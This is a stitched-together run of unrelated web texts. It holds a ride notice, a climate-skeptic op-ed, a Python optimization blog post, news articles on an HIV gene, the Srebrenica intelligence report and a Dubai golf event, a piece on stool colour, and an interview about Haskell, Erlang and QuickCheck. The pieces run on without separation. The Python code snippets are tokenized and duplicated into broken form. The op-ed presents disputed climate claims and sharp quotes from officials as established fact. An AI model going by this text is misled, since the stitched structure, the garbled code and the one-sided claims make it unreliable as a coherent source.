We ’re going to try and drum up a Hot Chocolate sponsor to warm everyone up before we head out .
Since we ’re a few weeks out , the weather is unpredictable at this point , so you might want to look at buying some thermals in preparation .
For those who have not attended a BFOC group ride , we ride very casually , and move at a slow to moderate pace .

Fred Schwindel ’s TV City ad promises 40 ” flat screen televisions for $ 200 .
You rush to his store , to learn he ’s fresh out but has some 42 ” models for $ 1000 .
That ’s bait - and - switch , and Fred could be prosecuted for consumer fraud .
In the political arena , however , bait - and - switch is often rewarded , not punished especially in the case of global warming alarmism .
Instead of fines or jail time , politicos get committee chairs , presidencies , speaking fees and Nobel Prizes .
Scientists and bureaucrats receive paychecks , research grants and travel stipends for Bali .
Activists get secretive government payments for public education campaigns .
Companies get government contracts , subsidies and seats at the bargaining table .
And all are lionized or canonized for supporting Climageddon theories and policies .
Global warming bait - and - switch starts with simple statements that few would contest then shifts seamlessly to claims that are hotly disputed and supported by little or no evidence .
The bait : Global warming is real .
The switch : Global warming is intensifying and threatens agriculture , human civilization and the fabric of life everywhere on earth .
Bait : 99 % of scientists agree on the presence of human - caused global warming .
Switch :
The debate is over .
Humans are the primary cause of temperature increases .
Bait : Atmospheric carbon dioxide from human activities is increasing .
Switch : CO2 is the dominant greenhouse gas and is reaching unprecedented and dangerous levels .
Bait : Earth warmed during the twentieth century , as CO2 levels increased .
Switch : Runaway warming is increasing hurricanes , melting polar ice caps , raising sea levels and causing species extinction .
Bait :
Even little things like reducing personal energy consumption help the environment .
Switch :
We can stop climate change by switching to wind and solar energy .
The perpetrators of these B/S schemes may never be chastened or prosecuted .
However , as in the case of consumer fraud , an informed public is less likely to get fleeced .
President Obama and congressional Democrats support a $ 650 billion carbon cap - and - trade tax on every household , business and factory in America .
If they introduce legislation amid this recession , voters , energy consumers and more responsible legislators should keep important facts in mind .
Global warming ( aka climate change ) has been real since time began .
Witness the Ice Ages , interglacial periods , Medieval Warm Period ( 950 -1350 ) , Little Ice Age ( 1400 - 1850 ) , Anesazi drought , Dust Bowl , and conversion of verdant river valleys into the Sahara Desert some 4,000 years ago .
No one yet knows what solar energy fluctuations , planetary orbit shifts , recurrent oscillations in ocean currents , cloud cover variation and other natural forces combined to cause these potent climatic changes .
But there is no evidence that they have suddenly been displaced by human CO2 emissions .
Growing numbers of scientists say the climate change debate is far from over , and global warming was never a crisis .
Over 650 certified meteorologists and climate scientists are on a US Senate compilation of climate cataclysm skeptics and 32,000 scientists have signed the Oregon Petition , saying they dispute claims that humans are causing climate change , and the changes will be disastrous .
Many of them are meeting in New York March 8 - 10 , at the 2009 International Conference on Climate Change .
They may not drive the final nails into the coffin of climate hysteria , but their findings and analyses underscore the lack of evidence for scary forecasts that are routinely generated by woefully inadequate computer models and self - interested researchers , activists and politicians .
They will point out that planetary temperatures are no longer rising , hurricanes are not increasing in number or intensity , ice caps are not disappearing , and moderate temperature and CO2 increases benefit plant growth .
The UNï¿½s Intergovermental Panel on Climate Change claims to be the world ’s most authoritative body on the subject .
However , only something on the order of 20 % of the panel ’s scientists have some dealing with climate , admits a senior member .
Even the IPCC chairman is an economist , not a scientist .
Worse , says atmospheric scientist Dr. Roy Spencer , the IPCC insists that human carbon dioxide emissions drive global warming .
It has never seriously investigated the possibility that climate change might be natural .
The IPCC sees only what it is looking for ; it sees nothing it is not looking for .
Atmospheric carbon dioxide levels may have “ soared ” from 280 ppm to 385 ppm over the last century .
But this represents an almost trivial rise from 0.03 % of the atmosphere to 0.04 % — the equivalent of an increase from 3 cents to 4 out of $ 100 , or from 1.08 inches to 1.44 inches on a football field .
The dominant greenhouse gas is water vapor , which nature controls via evaporation and precipitation .
Planetary temperatures may have increased during the last century , as CO2 levels increased .
But not in a straight line .
They rose 1900 - 1940 ( 1934 was the century ’s warmest year ) , fell 1940 - 1975 , rose again 1975 - 1998 , then stabilized and even declined slightly from 1998 to 2008 .
New York , Holland and Bangladesh might be inundated by a 49 - foot rise in sea level , if the entire West Antarctic ice sheet melted .
But that would require a global temperature spike far greater than even Al Gore has prophesied .
The average temperature for the peninsula ’s two - month summer is barely 36 F ; in the winter , temperatures are below minus 50 .
Unplugging unused appliances and switching to CFL bulbs may help jet - setting Hollywood celebrities feel better .
But they will not stabilize Earth ’s climate .
Even grounding Al Gore and John Travolta ’s private jets , scrapping every US automobile , mothballing America ’s coal - fired power plants , and slashing US CO2 emissions by 80 percent ( back to 1905 levels ) , as President Obama wants to do , will have little effect .
Even the IPCC recognizes that perfect compliance with the Kyoto Protocol by every country would reduce global temperature increases by only 0.2 degrees by 2050 ( assuming CO2 does drive global warming ) .
But Europe has put its greenhouse gas reduction programs on hold .
Australia is poised to reject cap - and - trade plans .
China and India are building new coal - fired power plants every week .
Nearly 85 percent of US energy is hydrocarbon based , whereas wind turbines currently provide 0.5 % and generate electricity only 25 percent of the time .
Even absent the deepening recession , taxing and penalizing hydrocarbon use and CO2 emissions will drive up energy costs and extinguish far more jobs than can possibly be created via government - subsidized renewable energy and green - collar job initiatives .
The impacts on poor families , economic civil rights , living standards and civil liberties would be severe .
Not surprisingly , the more people understand these facts , the worse the hysteria gets .
Al Gore : Soaring global temperatures will bring human civilization to a screeching halt .
Energy Secretary Stephen Chu :
We ’re looking at a scenario where there ’s no more agriculture in California .
NOAA scientist Susan Solomon :
In ten years the oceans will be toxic , and all life in them will die .
NASA astronomer James Hansen : Death trains are carrying poisonous fuel to coal - fired factories of death .
Hollywood horror movie writers could n’t possibly top this stuff .
So when Congress and the President call for more economic pain through energy restrictions and cap - and - trade bills , demand solid evidence for catastrophic warming and human causation .
Do n’t accept worthless computer models and worst - case scenarios .
And do n’t be conned by bait - and - switch tactics .
Following my previous post on Optimizing Javascript , I thought I ’d write a similar post regarding Python optimization .
Before going on to the more interesting stuff , there are a few issues that need to be addressed :
0. Basics
Know the basics – especially profiling !
Just by looking at the profiling output , you can tell where does the computing time go .
To get that information , I like to sort on cumulative time ( i.e , time taken by a given function and all functions called from it , over all of its calls ) .
0.5 . Knowing your goal , and your enemy
The kind of optimizations you do , and how far you ’re willing to go is dependent on your code ’s users .
If you ’re writing batch processing software , your required time for running might be a minute , an hour , or a day .
So far , I had to optimize various cases of weeks to minutes for batch processing and also seconds to milliseconds for web - application UI .
Your timing should apply to typical input , and probably to your biggest probable input as well .
Create some simple benchmark you can test your code against .
It ’s important that your benchmark be typical ‘ complexity - wise ’ , but smaller in size , so that running it and getting profiling results takes no more than a few seconds .
You may even want multiple benchmarks , each one for a different size .
That way , once you are more sure of yourself , you can run your code against the larger benchmark .
If your benchmarks are real inputs – all the better .
1. Python vs. C and similar considerations
In my line of work , I usually do research oriented development .
That means that it ’s harder to know upfront where the bottlenecks will be .
As a result , the prevailing attitude is usually “ let ’s write it in Python , and later , when the need arises , convert the critical code to C ” .
So far , I have n’t had the chance to do that .
Usually what happens is we write the code , it works well enough , and we figure that the flexibility of writing it in Python is more important than the Python to C conversion gains .
Also , Python is not always the bottleneck – sometimes it ’s a database , or some 3rd party API .
Usually “ import pysco ” , and changing the code to allow parallel processing is cheaper and simpler than the conversion to C .
2 . The small time - eater
A common problem is when a relatively trivial function is taking a lot of cumulative time .
That ’s usually a sign you ’re doing something wrong .
I had this issue when I used my symbolic constants for a new project .
Consider the following :
def SymbolInt ( value , name ) : class _ SymbolInt ( int ) : def __str__ ( self ) : return name def __repr__ ( self ) : return ' SymbolInt ( %d , " % s " ) ' % ( value , name ) def __eq__ ( self , other ) : if isinstance ( other , str ) : other = other .
lower ( ) return int ( self ) == other or name .
lower ( ) == other def __ne__ ( self , other ) : return not self == other return _ SymbolInt ( value ) def SymbolInt ( value , name ) : class _ SymbolInt ( int ) : def __str__( self ) : return name def __repr__( self ) : return ' Symbol Int ( %d , " % s " ) ' % ( value , name ) def __eq__ ( self , other ) : if isinstance ( other , str ) : other = other.lower ( ) return int( self ) ==other or name.lower ( ) == other def __ne__ ( self , other ) : return not self == other return _ SymbolInt ( value )
This one is very nice for interactive interfaces .
However , in the new project , I found out that __eq__ was taking * a lot* of time .
Way more than it should , even when I was n’t comparing SymbolInt -s to strings !
It turned out that ‘ or name. lower ( ) == other ’ was very bad speed wise .
So for that project , I removed this subcondition , and voila !
My code was fast !
3 . The algorithm is critical
In many cases I ’ve worked on , the greatest reductions in running time were due to algorithm changes .
That means that playing with issues such as variable lookups and so on should come after you ’re mostly settled on your algorithm .
The latest example that I can think of is the set counting problem , where using my solution got me down from two weeks to 20 something minutes on my real input .
Later I did some simpler optimizations that chopped off a few more minutes .
4. Avoiding loops
That one is easy .
Everyone knows you should avoid loops , especially nested ones .
Still , there are some cases where your code just has to have these loops – because that ’s the essence of what your code is doing .
To make loop avoidance possible , and specifically cartesian product kind of loops , consider refactoring your code to use set intersections and unions .
As simple illustration , consider :
Instead of this ,
for x in a : for y in b : if x == y : yield ( x , y ) for x in a : for y in b : if x == y : yield ( x , y )
do this :
return set ( a ) & set ( b ) return set ( a ) & set ( b )
Sometimes , applying this change does n’t quite fit your algorithm .
In that cases , try to change your algorithm to accommodate .
For example , it might yield less accurate results .
In that case , aim for returning more than you need , and then do a second pass to filter the bad ones .
The time gains from avoiding the extra loops should still be worth it .
( Note : this is similar to doing your computations in your database queries instead of in your code .
Similar ideas apply . )
5. Lookups
If you spend time looking for something , use a dict .
If that is not feasable , use any other data - structure that fits your problem .
For example , let ’s say you ’re looking for given strings in a lot of files .
You can build a small index beforehand , and instead of looking at the files each time , just look at this index .
( Note : this is similar to creating an index on the database column you are searching on . )
6. Memory
When dealing with large inputs , you ’ll usually want to reduce your memory requirements .
Consider an algorithm that requires O ( n ) memory , for n-sized inputs .
All you need is a factor of 4 , and 500 megs of input , and your code will choke on many current machines .
Also , I ’ve found out that writing your code in such a way as to use drastically less memory , will sometimes force me to write it more time - efficiently as well .
There are a few techniques to dealing with the memory issue .
The central idea is to have as little of your data as you need available at any time .
7. Generators
Generator expressions are usually preferable to list comprehensions .
Similarly , consider replacing this kind of functions :
def myfunc ( some_input ) : ... result = [ ] for bla in foo : ... result .
append ( bar ) return result def myfunc ( some_input ) : ... result = [ ] for bla in foo : ... result.append ( bar ) return result
with the following idiom :
def myfunc ( some_input ) : ... for bla in foo : ... yield bar def myfunc( some_input ) : ... for bla in foo : ... yield bar
This has the added advantage of simplifying myfunc , as its state is kept for you .
On really big inputs and outputs , this one could save you from keeping all of your output in memory .
If you are not familiar with generators , I suggest reading David Beazley ’s presentation on the subject , it ’s an excellent read , regardless of optimizations .
8. Outputs
If your goal is to generate output , dump it to a file as soon as possible .
This is made simple by the previous idiom :
for bar in myfunc ( ) : # process bar ... dump ( foobar ) for bar in myfunc ( ) : # process bar ... dump( foobar )
Just make sure that dump does n’t keep your data around for too long .
For example , I once had to insert a lot of data into a database .
After I finished processing each record , I would insert it .
The bottleneck was the database .
I tried flushing only after several inserts ( which meant inserts in chunks of N for various N ) , until I was introduced to the solution : bulk inserts .
The , my extraction script just dumped to a text file , which was lightning fast , and later I did the bulk insert .
9. Summing up
Do
sum ( x for x in some_generator ) sum( x for x in some_generator )
Instead of
for x in some_list : my_sum + = x for x in some_list : my_sum += x

WASHINGTON ( Reuters ) -
An HIV genetic stowaway that may have come from a related cat virus could help the AIDS virus transmit and replicate in people , U.S. researchers reported on Sunday .
Their finding , which has implications for designing new drugs or a vaccine against the fatal and incurable virus , may also shed light on how other viruses , such as swine flu , spread from animals to people , experts said .
And it also may help explain how an ancient virus came to cause the devastating 25 - year - long pandemic of AIDS .
Dr. Robert Bambara of the University of Rochester Medical Center in New York and colleagues found the previously unnoticed stretch of genetic material in the RNA sequence of the virus .
HIV is a so - called retrovirus -- it uses RNA , instead of DNA , to function .
This little bit of genetic material closely mimics a stretch of human RNA , they reported in the journal Nature Structural and Molecular Biology .
“ We not only found the gene , but also a plausible explanation for why it is still there after millions of generations : its presence makes HIV dramatically better at reproducing inside of our cells , ” Bambara said in a statement .
“ This suggests new ways to shut down with drugs the ability of the virus to mass produce copies of itself . ”
HIV is believed to have jumped to humans from a close relative called simian immunodeficiency virus or SIV , which infects chimpanzees .
“ Feline immunodeficiency virus ( FIV ) , which infects cats , is thought to be the virus from which SIV originated and therefore an ancestor of HIV , ” the researchers wrote .
“ HIV - related viruses have been identified in sheep , goats , horse , cattle and cats , but only the cat virus FIV seems to be a close relative of HIV and SIV . ”
The gene Bambara ’s team found looks very much like human tRNALys , which HIV needs to replicate itself .
Like all viruses , HIV “ lives ” by infecting cells , hijacking their machinery and turning them into factories that make copies of the virus .
“ Determination of the origin of the tRNA - like sequence should provide valuable clues about the ancestry of HIV , ” the researchers wrote .
Studying this genetic sequence more may help scientists understand how viruses jump from animals to humans , added Matthew Portnoy of the National Institute of General medical Sciences , one of the National Institutes of Health .
The study “ has broader implications beyond HIV research , and may impact the response to the current H1N1 flu pandemic , where that virus has jumped multiple species and picked up several parts of its genome from each of the many species it has passed through , ” Portnoy said in a statement .
“ Understanding the mechanisms of these transfers enables researchers to better understand the evolution of viruses , and hopefully to better predict their ‘ next move ’ as they design vaccines and treatments , ” Portnoy said .
HIV now infects an estimated 33.4 million people , according to the United Nations , and has killed 25 million .
H1N1 swine flu is still spreading globally and has infected tens of millions .
Two Science Questions from a Toddler in the same month ?
It 's a Festivus miracle !
Or , you know , the unexpected byproduct of trying to write weekly blog posts during a month where damn - near all the sources you need to talk to are on vacation .
But I 'm a glass is half - full kind of woman .
Speaking of byproducts , BB reader Tammy says there 's a small person in her life who wants to know , " Why is poop brown ? "
First off , the fact that this kid 's poop is brown is a really good sign .
See , your stool can come in several different colors .
Brown just happens to be the color of good health .
" Bile comes from your gall bladder and helps your body digest food , " said Anish Sheth , M.D. , assistant professor at Yale Medical School and author of the book What 's Your Poo Telling You ?
" It 's metabolized by the bacteria in your large intestine , leaving behind a byproduct called stercobilin — and it's that stercobilin that gives stool a brown pigment . "
Without stercobilin , your poo would actually be a sort of pale , off - grey color , like white clay .
This really does happen from time to time , Dr. Sheth said , when something is blocking a patient 's bile duct , so that bile can't get from the gall bladder into the intestinal tract .
The cause could be as simple as a gall stone , or as ominous as pancreatic cancer .
In fact , the color of poop can offer some surprising insights into what 's going on with the human body .
In the days before fancy medical technology , doctors looked at the color and texture of poop to help diagnose gastro - intestinal illness .
Today , changes in stool are still frequently the first sign that something is wrong .
There 's three main " wrong colors " your poop can be :
Red
Means : Internal bleeding , or that you 've recently eaten beets
If it only happens once , it 's probably the beets .
But ongoing red poop likely means you 're bleeding somewhere along your G - I plumbing .
If the problem is near the bottom , in the intestines , Dr. Sheth said , the poop will be bright red .
But if you 're bleeding from the throat or stomach , then the blood will get digested along with whatever you 've eaten — leaving you with black , tar - like poop .
" It has a very distinctive smell , too .
I 'm not really sure how to describe it .
But once you 've smelled it , you do n't forget it , " Dr. Sheth said .

Yellow
Means :
There 's fat in your poop
The yellow color is the least disgusting part of this problem .
Fatty poop also smells way worse than normal and it tends to float .
" Like an oil slick , " Dr. Sheth said .
That 's not a good thing , to put it mildly .
In general , your body ought to be able to digest and absorb fat .
If it 's not , there 's probably something wrong with your digestive system .

Green
Means :
You 've probably got a bacterial infection
A particular kind of bacteria that can infect your colon can also turn your poop green — the color is a direct result of the presence of bacteria in the poop .
While I had Dr. Sheth on the line , I decided that I had to ask him the ultimate " Why does my poop look like that " question .
Oh yes , I asked about corn .
" There are a lot of things that we can't fully digest .
I call it ' Deja Poo ' .
Corn is just the most common example , " Dr. Sheth said .
The key is fiber .
There 's two kinds : Soluble and insoluble .
If what you eat has a lot of insoluble fiber , it 'll come out your other end mostly intact , because your body can't digest it .
The foods that contain insoluble fiber foods are almost all plants , Dr. Sheth said , because humans have n't evolved the enzymes necessary to break down some plant cell walls .
In the case of corn , some of the plant is soluble fiber and some is n't .
" There 's two parts of the corn — the exterior kernel that we pass through and the germ inside of it .
The germ is actually extracted .
The whole kernel is immersed in digestive enzymes and your body pulls out what it can use , " Dr. Sheth said .
" What it ca n't use just passes on . "

Baldrick was abandoned by his mother in a garden .
The official Dutch inquiry into the 1995 Srebrenica massacre , released last week , contains one of the most sensational reports on western intelligence ever published .
Officials have been staggered by its findings and the Dutch government has resigned .
One of its many volumes is devoted to clandestine activities during the Bosnian war of the early 1990s .
For five years , Professor Cees Wiebes of Amsterdam University has had unrestricted access to Dutch intelligence files and has stalked the corridors of secret service headquarters in western capitals , as well as in Bosnia , asking questions .
His findings are set out in " Intelligence and the war in Bosnia , 1992 - 1995 " .
It includes remarkable material on covert operations , signals interception , human agents and double - crossing by dozens of agencies in one of dirtiest wars of the new world disorder .
Now we have the full story of the secret alliance between the Pentagon and radical Islamist groups from the Middle East designed to assist the Bosnian Muslims - some of the same groups that the Pentagon is now fighting in " the war against terrorism " .
Pentagon operations in Bosnia have delivered their own " blowback " .
In the 1980s Washington 's secret services had assisted Saddam Hussein in his war against Iran .
Then , in 1990 , the US fought him in the Gulf .
In both Afghanistan and the Gulf , the Pentagon had incurred debts to Islamist groups and their Middle Eastern sponsors .
By 1993 these groups , many supported by Iran and Saudi Arabia , were anxious to help Bosnian Muslims fighting in the former Yugoslavia and called in their debts with the Americans .
Bill Clinton and the Pentagon were keen to be seen as creditworthy and repaid in the form of an Iran - Contra style operation - in flagrant violation of the UN security council arms embargo against all combatants in the former Yugoslavia .
The result was a vast secret conduit of weapons smuggling though Croatia .
This was arranged by the clandestine agencies of the US , Turkey and Iran , together with a range of radical Islamist groups , including Afghan mojahedin and the pro-Iranian Hizbullah .
Wiebes reveals that the British intelligence services obtained documents early on in the Bosnian war proving that Iran was making direct deliveries .
Arms purchased by Iran and Turkey with the financial backing of Saudi Arabia made their way by night from the Middle East .
Initially aircraft from Iran
Air were used , but as the volume increased they were joined by a mysterious fleet of black C - 130 Hercules aircraft .
The report stresses that the US was " very closely involved " in the airlift .
Mojahedin fighters were also flown in , but they were reserved as shock troops for especially hazardous operations .
Light weapons are the familiar currency of secret services seeking to influence such conflicts .
The volume of weapons flown into Croatia was enormous , partly because of a steep Croatian " transit tax " .
Croatian forces creamed off between 20 % and 50 % of the arms .
The report stresses that this entire trade was clearly illicit .
The Croats themselves also obtained massive quantities of illegal weapons from Germany , Belgium and Argentina - again in contravention of the UN arms embargo .
The German secret services were fully aware of the trade .
Rather than the CIA , the Pentagon 's own secret service was the hidden force behind these operations .
The UN protection force , UNPROFOR , was dependent on its troop - contributing nations for intelligence , and above all on the sophisticated monitoring capabilities of the US to police the arms embargo .
This gave the Pentagon the ability to manipulate the embargo at will : ensuring that American Awacs aircraft covered crucial areas and were able to turn a blind eye to the frequent nightime comings and goings at Tuzla .
Weapons flown in during the spring of 1995 were to turn up only a fortnight later in the besieged and demilitarised enclave at Srebrenica .
When these shipments were noticed , Americans pressured UNPROFOR to rewrite reports , and when Norwegian officials protested about the flights , they were reportedly threatened into silence .
Both the CIA and British SIS had a more sophisticated perspective on the conflict than the Pentagon , insisting that no side had clean hands and arguing for caution .
James Woolsey , director of the CIA until May 1995 , had increasingly found himself out of step with the Clinton White House over his reluctance to develop close relations with the Islamists .
The sentiments were reciprocated .
In the spring of 1995 , when the CIA sent its first head of station to Sarajevo to liaise with Bosnia 's security authorities , the Bosnians tipped off Iranian intelligence .
The CIA learned that the Iranians had targeted him for liquidation and quickly withdrew him .
Iranian and Afghan veterans ' training camps had also been identified in Bosnia .
Later , in the Dayton Accords of November 1995 , the stipulation appeared that all foreign forces be withdrawn .
This was a deliberate attempt to cleanse Bosnia of Iranian - run training camps .
The CIA 's main opponents in Bosnia were now the mojahedin fighters and their Iranian trainers - whom the Pentagon had been helping to supply months earlier .
Meanwhile , the secret services of Ukraine , Greece and Israel were busy arming the Bosnian Serbs .
Mossad was especially active and concluded a deal with the Bosnian Serbs at Pale involving a substantial supply of artillery shells and mortar bombs .
In return they secured safe passage for the Jewish population out of the besieged town of Sarajevo .
Subsequently , the remaining population was perplexed to find that unexploded mortar bombs landing in Sarajevo sometimes had Hebrew markings .
The broader lessons of the intelligence report on Srebrenica are clear .
Those who were able to deploy intelligence power , including the Americans and their enemies , the Bosnian Serbs , were both able to get their way .
Conversely , the UN and the Dutch government were " deprived of the means and capacity for obtaining intelligence " for the Srebrenica deployment , helping to explain why they blundered in , and contributed to the terrible events there .
Secret intelligence techniques can be war - winning and life - saving .
But they are not being properly applied .
How the UN can have good intelligence in the context of multinational peace operations is a vexing question .
Removing light weapons from a conflict can be crucial to drawing it down .
But the secret services of some states - including Israel and Iran - continue to be a major source of covert supply , pouring petrol on the flames of already bitter conflicts .

Earth , the planet , might have been created in seven days , but Earth , the golf course , has taken a damn sight longer .
In fact , the spectators here yesterday watching practice could have been forgiven for surmising it has yet to be finished .
But , however many cranes , diggers and mixers are in sight of the fairways , the blessed reality is that all 18 holes have been designed , sculpted and cut , and will be ready to stage the first round of the inaugural Dubai World Championship tomorrow .
And so the European Tour 's brave new era will have its season - ending spectacular ; 58 golfers competing for £ 7.5 m .
Will it really matter that those golden - spiked competitors will be emerging from a temporary structure to do battle ?
Yes , that 's correct , the clubhouse here is not complete .
The shell is up but the marble is not laid , the lockers not fitted , the members ' bar not replete with the Axminster and leather upholstery .
If any evidence is needed as to what stage Dubai happened to be at when the money finally ran out , surely this a good place to start .
It was May when the decision was made to " mothball " the austere building that was to take its traditional place overlooking the climatic green .
At the risk of stating the insultingly obvious , this is not how it was meant to be .

Two years ago Leisurecorps – a Dubai government - owned subsidiary – sounded a great fanfare and announced it would be replacing the Volvo Masters at Valderrama as the hosts of the Order of Merit finale .
With a pot of £ 10 m , the climax to the " Race to Dubai " would be the richest event in golf and would take place at one of the world 's most impressive complexes .
Four courses were to feature – named Earth , Fire , Wind and Water – and these would be surrounded by 600 residential properties , with prices ranging from £ 750,000 up to £ 3 m .
But then came the global downturn .
Wind and Water went down the plug - hole and the house - construction stalled before halting entirely .
Of course , Jumeirah Golf Estates were not alone in this regard .
Anything but .
Dubai was in trouble and a golf tournament was perhaps not top of the Emirate 's priority list .
Time for choices that Solomon , himself , might have found cold - hearted .
The five - year deal was inevitably renegotiated and in September , George O'Grady , the European Tour 's chief executive , revealed the prize - fund would be cut by 25 percent .
Such were the concerns among the pros on the range , the overwhelming feeling was one of relief .
Maybe the DWC would not be " the richest " , but with £ 7.5 m on offer it would undeniably be rich .
Come Sunday evening one man could still be putting for £ 1.6 m .
That truly would be a surreal scenario , with half - built villas as far as the laser range - finder can see .
Leisurecorps points out it never guaranteed those properties would be finished for this first staging and insist that , thanks to this event , the project will soon return to being gloriously on track .
" The Dubai World Championship will be watched by 50 m on TV and will be attended by 50,000 , " said a spokesman yesterday .
" You can't buy that exposure when you are selling real estate and we stand by our original strategy . "
But Dubai has bought this exposure , at unfathomable expense , and to many here it is baffling that a few million was not found to open the clubhouse on time .
At least the course is playable , although the verdict from the pros could hardly be described as being overwhelmingly positive .
One called it " adequate " , another " uninspiring " .
Earth has no rough to speak of and the fairways are wide .
In situ , however , the cracks are too blatant to ignore .
Even if it is possible to blank out the windowless and roofless , then the stench from the pond on the sixth hole is unavoidable .
Augusta National famously uses blue dye to enhance their water features ; Jumeirah should have resorted to Blue Toilet Block .
There is also a quilt - work patch of fairway on the seventh which will have to be Ground Under Repair should any ball fall that short .
Yet if they are the only problems , the players will cope .
In fact , there will be a new European No 1 crowned here whatever happens .
Thank goodness that Rory McIlroy , Lee Westwood , Martin Kaymer and Ross Fisher have made this an enthralling four - player dash for the line .
By this time next year , Leisurecorps confirms everything will be complete .
It may all sound a bit Del Boy and Rodney but that 's where Europe 's finest golfers happen to be right now .
And they 'll all still be millionaires regardless .

1. I 'm Sadek Drobi , I 'm here with John Hughes , at Erlang Factory .
John , can you tell us a bit about yourself and what you 've been busy with ?
I 'm at heart an academic , I 've been a professor for many years and I got interested in functional programming way back in the mid ' 70s .
I 've been working with it throughout my career , both with the design of Haskell and more recently , when the functional programming has become to make a move into industry , then I 've been working with Erlang .
So , I 'm very much a fanatic of technology - I love it and very much enjoying seeing that it 's finally bearing fruits .
In industry , what I 've been doing most recently is working with my testing tool , QuickCheck and spending a lot of time with my company that is marketing that .
2. From Haskell to Erlang , what made the move ?
We had a customer !
Some of the Erlang users at Ericsson , especially Ulf Wiger were interested in using a version of QuickCheck , so I made a version in Erlang .
At that time , certainly there were n't very many or perhaps hardly any Haskell users in the commercial world .
So , if we wanted customers , then Erlang was a much better choice .
3 . Do you miss laziness from Haskell ?
Yes , absolutely .
I have Macros in Erlang that simulate it and I use them all the time .
4 . And types ?
Yes , of course .
What I miss , when I think of type error , it 's not immediately discovered and that 's very useful , no doubt about that and I do spend some time looking for errors that the Haskell type checker would tell me about immediately .
But what that means , is that I have to find my type errors by thorough testing .
Oh , wait a minute , I 'm working with a testing tool !
I actually find that the type errors are found very quickly by QuickCheck tests , so I need to write QuickCheck properties for testing , anyway , so that it 's not as big a problem as I might have expected not to have the type checker .
5 . What attracts you most in Erlang in contrast to Haskell ?
There are advantages than not having type checker , namely generic programming .
If you do generic programming in Haskell , you can write a paper about it .
If you do generic programming in Erlang , it 's 4 lines - one for lists , one for tuples , one for basic values .
Maybe they are only 3 lines !
But it 's very easy to do generic programming and I do that a lot in the Erlang version of QuickCheck .
I 've been able to make what the user has to write , to write QuickCheck specifications simpler and more elegant , thanks to the lack of a type system in Erlang .
Erlang is very good for meta programming .
It 's not something that is a lot harder to do in Haskell .
6. QuickCheck you designed in the beginning in Haskell , right ?
And then you did a version for Erlang and now you are using it to test race conditions .
Can you tell us more about this ?
This is some recent work we 've been doing as part of the Protest project , which is a project that the EU Framework Program is financing and what we are doing is running current Erlang programs under control of our own scheduler .
We define a scheduler as an Erlang process and we instrument the code under test , so that all of the other processes talk to our scheduler and they say " Is n’t it my turn yet ? "
Then , the scheduler says " Now it 's your turn " .
That lets us randomize the execution and makes it much more likely that we 'll provoke race conditions .
That 's a fairly standard approach , actually .
What is more novel about what we are doing is that we are generating the parallel test cases using QuickCheck .
We found that we are able to shrink parallel test cases and produce the same kind of minimal examples that make sequential bugs easy to find .
We can produce some of those that provoke race conditions .
That 's very interesting !
7 . Higher order programming with Haskell is easy because of types .
Do n't you think that types are enablers for higher order programming ?
Yes .
When you do higher order programming , you have to know what the types of your functions are .
I do higher order programming all the time in Erlang and I know what the types of my functions are .
They are a very valuable intellectual tool for understanding the complexity of higher order programs , whether or not you have a type checker that checks them .
In Erlang I do n't have a type checker that checks them , but that does n't bother me so much .
8. Both Haskell and Erlang inspire the industry or mainstream in some way or another .
Can you tell a bit about what are your favorite features from both languages that are getting mainstream in some way ?
In Erlang 's case it must be the concurrency and the very nice error handling and features for fault tolerance .
In the case of Haskell , I guess it is perhaps Haskell ’s ability to capture domain specific languages very elegantly , this having a lot of impact .
There are several features in the language that make Haskell so good for that .
One is the type system which is very flexible , another is support for higher order programming , which is really essential for defining many domain specific languages , but also lazy evaluation .
Lazy evaluation is quite critical for defining the interface of a domain specific language .
In Erlang I have to use macros to get the same effect , because you want to be able to define constructions like conditionals that do n't evaluate over their branches and lazy evaluation makes that easy to do .
Some of my favorite Haskell applications are things like the financial combinators that Lennart Augustsson is working with , where you write Haskell code or what looks like a domain specific language , but is actually Haskell code that then generates Excel interfaces to the computing engines that perform these heavy financial computations - I think that kind of thing is really cool .
9 . With Haskell you 've been always thinking it 's side effect free , right ?
Writing a function is side effect free .
In Erlang just the fact of passing a message is a side effect .
Do n't you find it a bit of a problem or a difficulty when programming with Erlang ?
Most of my Erlang programming is side effect free .
I think I probably write very unusual Erlang programs that look a lot like Haskell ones .
Now and then , I do write side effecting code .
For example , when I use the random number generation libraries that comes with Erlang , it has a side effecting interface .
It 's very tempting when you are building something on top of the library with a stateful interface to build code on top of that that also has a stateful interface .
That 's what I did the first time I tried to use it .
That has caused me so much trouble .
I think every single bug that I spent hours trying to track down has been caused by a side effect .
In a way , I 've been programming Haskell for so many years , that I 'd forgotten just how devastating side effects are and just how difficult they make debugging .
I 've learnt that lesson again and nowadays , if I want to use a stateful library , I usually build a side effect free interface on top of it , so that I can then use it safely in the rest of my code .
13 .
For people that do n't know about it , can you introduce it a bit to contrast it to unit testing ?
When you write QuickCheck tests , what you write is a property and the properties of the form for all test cases in some set , some general property should be true .
The difference from unit testing is that you specify a property of a whole set of test cases and then , when QuickCheck runs a test , what it does is it generates an element of that set .
Your test cases are generated rather than being prescribed by the programmer .
The property then has to determine whether an arbitrary test in this set has passed or not and that forces you to think more generally about the behavior or your code .
It 's not enough to think " If I put in an A , I should get out a B " .
You have to think of a general property that will always be true .
What you are writing is essentially a part of the form specification that can be more or less complete and the tool then generates as many tests as you like and checks the property of all of those cases .
When a test fails , then the generated test case is often not very easy to understand .
The reason for that is that we are using random generation .
Random generation of anything produces a lot of noise .
Somewhere in that test case , which can often be very large , there is some feature that causes the test to fail and we think of that as the signal .
The other thing that QuickCheck does is once we find a failing test that we know contains some feature that provokes a bug , we start systematically simplifying it and usually that works very well and we boil the test case down until we get a minimal example normally that provokes a failure .
That automates a very familiar part of debugging where you start off with some complex case that has failed and often you would manually start trying to remove parts of it and simplify it and boil it down to a simple case that you can then understand and diagnose .
We automate that process and I think that 's what people like most about the tool .
14 .
For some time , Java was the language of the mainstream .
Now we are hearing about lot of other languages , like Erlang , Haskell , F# .
Do you think that there will be a next big language or we will be using a lot of languages for doing what we want to do ?
Do you mean if there is going to be a winner ?
I suppose there will be maybe a small number of winners .
If you look at Haskell , for example , there are certain kinds of programming that Haskell is truly excellent for and other kinds of programming , where it 's entirely unsuitable .
I do n't think that Haskell will entirely replace C , for example .
But , I suppose , in the long term , it 's likely that perhaps one language of each kind will attract adherents , end up with better libraries , and in the end become the natural language of choice if you want to do that kind of programming .
I do n't know which languages that will be .
Erlang seems to be doing very well at the moment for its particular niche .
15 .
Are you still involved in the Haskell community ?
